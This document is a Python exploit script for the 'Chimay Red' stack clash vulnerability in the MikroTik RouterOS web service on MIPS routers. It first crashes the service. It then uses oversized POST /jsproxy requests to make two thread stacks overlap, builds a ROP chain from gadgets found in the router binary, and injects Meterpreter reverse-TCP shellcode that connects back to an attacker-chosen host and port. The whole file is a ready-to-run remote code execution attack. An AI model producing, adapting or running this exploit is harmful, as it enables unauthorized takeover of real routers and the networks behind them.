#!/usr/bin/env python3

# Mikrotik Chimay Red Stack Clash Exploit by BigNerd95

# Tested on RouterOS 6.38.4 (mipsbe) [using a CRS109]
# Tested on RouterOS 6.34 (mipsbe) [using RB450G]

# Used tools: pwndbg, rasm2, mipsrop for IDA
# I used ropper only to automatically find gadgets

# ASLR enabled on libs only
# DEP NOT enabled

import socket, time, sys, struct, re
from ropper import RopperService

AST_STACKSIZE = 0x800000 # default stack size per thread (8 MB)
ROS_STACKSIZE =  0x20000 # newer version of ROS have a different stack size per thread (128 KB)
SKIP_SPACE    =   0x1000 # 4 KB of 'safe' space for the stack of thread 2
ROP_SPACE     =   0x8000 # we can send 32 KB of ROP chain!

ALIGN_SIZE    = 0x10 # alloca align memory with 'content-length + 0x10 & 0xF' so we need to take it into account
ADDRESS_SIZE  =  0x4 # we need to overwrite a return address to start the ROP chain

class MyRopper():
    def __init__(self, filename):
        self.rs = RopperService()
        
        self.rs.clearCache()
        self.rs.addFile(filename)
        self.rs.loadGadgetsFor()
        
        self.rs.options.inst_count = 10
        self.rs.loadGadgetsFor()

    def get_gadgets(self, regex):
        gadgets = []
        for _, g in self.rs.search(search=regex):
            gadgets.append(g)

        if len(gadgets) > 0:
            return gadgets
        else:
            raise Exception('Cannot find gadgets!')

    def contains_string(self, string):
        s = self.rs.searchString(string)
        t = [a for a in s.values()][0]
        return len(t) > 0

    def get_arch(self):
        return self.rs.files[0].arch._name

    @staticmethod
    def get_ra_offset(gadget):
        '''
            Return the offset of next Retun Address on the stack
            So you know how many bytes to put before next gadget address
            Eg: 
                lw $ra, 0xAB ($sp)   --> return: 0xAB
        '''
        for line in gadget.lines:
            offset_len = re.findall('lw \$ra, (0x[0-9a-f]+)\(\$sp\)', line[1])
            if offset_len:
                return int(offset_len[0], 16)
        raise Exception('Cannot find $ra offset in this gadget!')

def makeHeader(num):
    return b'POST /jsproxy HTTP/1.1\r\nContent-Length: ' + bytes(str(num), 'ascii') + b'\r\n\r\n'

def makeSocket(ip, port):
    s = socket.socket()
    try:
        s.connect((ip, port))
    except:
        print('Error connecting to socket')
        sys.exit(-1)
    print('Connected')
    time.sleep(0.5)
    return s

def socketSend(s, data):
    try:
        s.send(data)
    except:
        print('Error sending data')
        sys.exit(-1)
    print('Sent')
    time.sleep(0.5)

def build_shellcode(LHOST, LPORT):
    # fork stub for prevent reverse shell from die
    # without this stub, your shellcode works fine but die when any web request happen!
    fork_stub = b''
    fork_stub += b'\x24\x02\x0F\xa2'	# li $v0, 4002
    fork_stub += b'\x01\x01\x01\x0c'	# sycall 0x40404
    fork_stub += b'\x10\x40\x00\x03'	# beq $v0, $zero, spawn
    fork_stub += b'\x24\x02\x00\x01'	# li $a0, 1
    fork_stub += b'\x24\x02\x0f\xa1'	# li $v0, 4001
    fork_stub += b'\x01\x01\x01\x0c'	# syscall 0x40404

    # spawn: shell code here!

    # meterpreter reverse tcp stage0 shell code
    shell_code =  b''
    shell_code += b'\x24\x0f\xff\xfa\x01\xe0\x78\x27\x21\xe4\xff\xfd\x21'
    shell_code += b'\xe5\xff\xfd\x28\x06\xff\xff\x24\x02\x10\x57\x01\x01'
    shell_code += b'\x01\x0c\x00\x07\x80\x2a\x16\x00\x00\x36\xaf\xa2\xff'
    shell_code += b'\xfc\x8f\xa4\xff\xfc\x24\x0f\xff\xfd\x01\xe0\x78\x27'
    shell_code += b'\xaf\xaf\xff\xe0\x3c\x0e' + struct.pack('>H', int(LPORT))	# LPORT
    shell_code += b'\xaf\xae\xff\xe4'
    shell_code += b'\x3c\x0e' + socket.inet_aton(LHOST)[0:2]	# LHOST low part
    shell_code += b'\x35\xce' + socket.inet_aton(LHOST)[2:4]	# LHOST high part
    shell_code += b'\xaf\xae\xff\xe6\x27\xa5'
    shell_code += b'\xff\xe2\x24\x0c\xff\xef\x01\x80\x30\x27\x24\x02\x10'
    shell_code += b'\x4a\x01\x01\x01\x0c\x00\x07\x80\x2a\x16\x00\x00\x25'
    shell_code += b'\x24\x04\xff\xff\x24\x05\x10\x01\x20\xa5\xff\xff\x24'
    shell_code += b'\x09\xff\xf8\x01\x20\x48\x27\x01\x20\x30\x20\x24\x07'
    shell_code += b'\x08\x02\x24\x0b\xff\xea\x01\x60\x58\x27\x03\xab\x58'
    shell_code += b'\x20\xad\x60\xff\xff\xad\x62\xff\xfb\x24\x02\x0f\xfa'
    shell_code += b'\x01\x01\x01\x0c\x00\x07\x80\x2a\x16\x00\x00\x15\xaf'
    shell_code += b'\xa2\xff\xf8\x8f\xa4\xff\xfc\x8f\xa5\xff\xf8\x24\x06'
    shell_code += b'\x10\x01\x20\xc6\xff\xff\x24\x02\x0f\xa3\x01\x01\x01'
    shell_code += b'\x0c\x00\x07\x80\x2a\x16\x00\x00\x0c\x8f\xa4\xff\xf8'
    shell_code += b'\x00\x40\x28\x20\x24\x09\xff\xfd\x01\x20\x48\x27\x01'
    shell_code += b'\x20\x30\x20\x24\x02\x10\x33\x01\x01\x01\x0c\x00\x07'
    shell_code += b'\x80\x2a\x16\x00\x00\x03\x8f\xb1\xff\xf8\x8f\xb2\xff'
    shell_code += b'\xfc\x02\x20\xf8\x09\x24\x04\x00\x01\x24\x02\x0f\xa1'
    shell_code += b'\x01\x01\x01\x0c\x00\x20\x08\x25\x00\x20\x08\x25'

    return fork_stub + shell_code

def build_payload(binRop, LHOST, LPORT):
    ropChain = b''
    shell_code = build_shellcode(LHOST, LPORT)
    
    # 1) Stack finder gadget (to make stack pivot) 
    stack_finder = binRop.get_gadgets('addiu ?a0, ?sp, 0x18; lw ?ra, 0x???(?sp% jr ?ra;')[0]
    '''
    0x0040ae04:                     (ROS 6.38.4)
        addiu $a0, $sp, 0x18   <--- needed action
        lw $ra, 0x5fc($sp)     <--- jump control   [0x5fc, a lot of space for the shellcode!]
        lw $s3, 0x5f8($sp)
        lw $s2, 0x5f4($sp)
        lw $s1, 0x5f0($sp)
        lw $s0, 0x5ec($sp)
        move $v0, $zero
        jr $ra
    '''
    ropChain += struct.pack('>L', stack_finder.address)
    #                                            Action: addiu  $a0, $sp, 0x600 + var_5E8                      # a0 = stackpointer + 0x18
    #                                            Control Jump:  jr    0x600 + var_4($sp) 
    # This gadget (moreover) allows us to reserve 1512 bytes inside the rop chain 
    # to store the shellcode (beacuse of: jr 0x600 + var_4($sp))
    ropChain += b'B' * 0x18  # 0x600 - 0x5E8 = 0x18           (in the last 16 bytes of this offset the shell code will write the arguments for execve)
    ropChain += shell_code   # write the shell code in this 'big' offset
    ropChain += b'C' * (MyRopper.get_ra_offset(stack_finder) - 0x18 - len(shell_code)) # offset because of this: 0x600 + var_4($sp)



    # 2) Copy a0 in v0 because of next gadget
    mov_v0_a0 = binRop.get_gadgets('lw ?ra, %move ?v0, ?a0;% jr ?ra;')[0]
    '''
    0x00414E58:                    (ROS 6.38.4)
        lw $ra, 0x24($sp);    <--- jump control
        lw $s2, 0x20($sp); 
        lw $s1, 0x1c($sp); 
        lw $s0, 0x18($sp); 
        move $v0, $a0;        <--- needed action
        jr $ra;
    '''
    ropChain += struct.pack('>L', mov_v0_a0.address) 
    #                                           Gadget Action:   move $v0, $a0                                 # v0 = a0
    #                                           Gadget Control:  jr  0x28 + var_4($sp) 
    ropChain += b'D' * MyRopper.get_ra_offset(mov_v0_a0) # offset because of this: 0x28 + var_4($sp) 



    # 3) Jump to the stack (start shell code)
    jump_v0 = binRop.get_gadgets('move ?t9, ?v0; jalr ?t9;')[0]
    '''
    0x00412540:                   (ROS 6.38.4)
        move $t9, $v0;       <--- jump control
        jalr $t9;            <--- needed action
    '''
    ropChain += struct.pack('>L', jump_v0.address)
    #                                           Gadget Action:   jalr $t9                                      # jump v0
    #                                           Gadget Control:  jalr  $v0    

    return ropChain

def stackClash(ip, port, payload):

    print('Opening 2 sockets')

    # 1) Start 2 threads
    # open 2 socket so 2 threads are created
    s1 = makeSocket(ip, port) # socket 1, thread A
    s2 = makeSocket(ip, port) # socket 2, thread B

    print('Stack clash...')

    # 2) Stack Clash
    # 2.1) send post header with Content-Length bigger than AST_STACKSIZE to socket 1 (thread A)
    socketSend(s1, makeHeader(AST_STACKSIZE + SKIP_SPACE + ROP_SPACE)) # thanks to alloca, the Stack Pointer of thread A will point inside the stack frame of thread B (the post_data buffer will start from here)

    # 2.2) send some bytes as post data to socket 1 (thread A)
    socketSend(s1, b'A'*(SKIP_SPACE - ALIGN_SIZE - ADDRESS_SIZE)) # increase the post_data buffer pointer of thread A to a position where a return address of thread B will be saved

    # 2.3) send post header with Content-Length to reserve ROP space to socket 2 (thread B)
    socketSend(s2, makeHeader(ROP_SPACE)) # thanks to alloca, the Stack Pointer of thread B will point where post_data buffer pointer of thread A is positioned

    print('Sending payload')

    # 3) Send ROP chain and shell code
    socketSend(s1, payload)

    print('Starting exploit')

    # 4) Start ROP chain
    s2.close() # close socket 2 to return from the function of thread B and start ROP chain

    print('Done!')

def crash(ip, port):
    print('Crash...')
    s = makeSocket(ip, port)
    socketSend(s, makeHeader(-1))
    socketSend(s, b'A' * 0x1000)
    s.close()
    time.sleep(2.5) # www takes up to 3 seconds to restart

if __name__ == '__main__':
    if len(sys.argv) == 6:
        ip       = sys.argv[1]
        port     = int(sys.argv[2])
        binary   = sys.argv[3]
        LHOST = sys.argv[4]
        LPORT = sys.argv[5]

        binRop = MyRopper(binary)

        if binRop.get_arch() != 'MIPSBE':
            raise Exception('Wrong architecture! You have to pass a mipsbe executable')

        if binRop.contains_string('pthread_attr_setstacksize'):
            AST_STACKSIZE = ROS_STACKSIZE

        payload = build_payload(binRop, LHOST, LPORT)

        crash(ip, port) # should make stack clash more reliable
        stackClash(ip, port, payload)
    else:
        print('Usage: ' + sys.argv[0] + ' IP PORT binary LHOST LPORT')
